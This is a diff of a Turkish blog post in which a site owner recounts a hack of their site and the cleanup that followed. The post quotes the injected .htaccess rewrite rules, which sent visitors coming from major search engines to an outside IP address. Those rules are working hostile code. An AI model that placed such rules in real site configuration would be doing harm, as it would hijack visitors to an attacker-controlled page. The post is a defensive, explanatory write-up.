@@ -15,13 +15,13 @@ tek yaptım - htaccess dosyasını sildim. - ftp şifremi değiştirdim -
 hostingh firmamdan sitemin bulnduğu klasörü bir virüs, malware
 taramasından geçirmelerini istedim. Sorunun ana nedeni htaccess
 dosyasında ki kodlar olarak görünüyor. Başta uzunca bir boşluktan sonra
-aşağıdaki kod yazıyordu. RewriteEngine On RewriteCond %{HTTP_REFERER}
-.*google.*$ [NC,OR] RewriteCond %{HTTP_REFERER} .*aol.*$ [NC,OR]
-RewriteCond %{HTTP_REFERER} .*msn.*$ [NC,OR] RewriteCond
-%{HTTP_REFERER} .*altavista.*$ [NC,OR] RewriteCond %{HTTP_REFERER}
-.*ask.*$ [NC,OR] RewriteCond %{HTTP_REFERER} .*yahoo.*$ [NC]
-RewriteRule .* http://89.28.13.202/in.html?s=ix [R,L] Bu arada cute
-ftp'de htaccess görüntülemeyide öğrendik.
+aşağıdaki kod yazıyordu. 
+
+RewriteEngine On RewriteCond %{HTTP_REFERER} .*google.*$ [NC,OR] RewriteCond %{HTTP_REFERER} .*aol.*$ [NC,OR]
+RewriteCond %{HTTP_REFERER} .*msn.*$ [NC,OR] RewriteCond %{HTTP_REFERER} .*altavista.*$ [NC,OR] RewriteCond %{HTTP_REFERER} .*ask.*$ [NC,OR] RewriteCond %{HTTP_REFERER} .*yahoo.*$ [NC]
+RewriteRule .* http://89.28.13.202/in.html?s=ix [R,L] 
+
+Bu arada cute ftp'de htaccess görüntülemeyide öğrendik.
 [http://blog.youontop.com/server-issues/view-htaccess-hidden-files-in-cuteftp-38.html][]
 Muhtemelen sorun haftasonu benim kalıcı bağlantılarım gittinde oldu ve
 ben bunu anlamadım. Asıl sorunun ise sitemi yahoo.com'da aradığımda
@@ -41,8 +41,6 @@ Ayrıca http://www.fatihhayrioglu.com/?ref=siteAdi gibi linkler var.
 Bunlarıda robots.txt User-agent: * Disallow: /*ref=* Disallow:
 /*?ref= kodlarını ekleyerek düzelttim. İşin ilginci bu linkleri
 google'un arama aracı nasıl buluyor.
-
-</p>
 
   [http://wordpress.org/support/topic/217700]: http://wordpress.org/support/topic/217700
   [http://blog.youontop.com/server-issues/view-htaccess-hidden-files-in-cuteftp-38.html]: http://blog.youontop.com/server-issues/view-htaccess-hidden-files-in-cuteftp-38.html
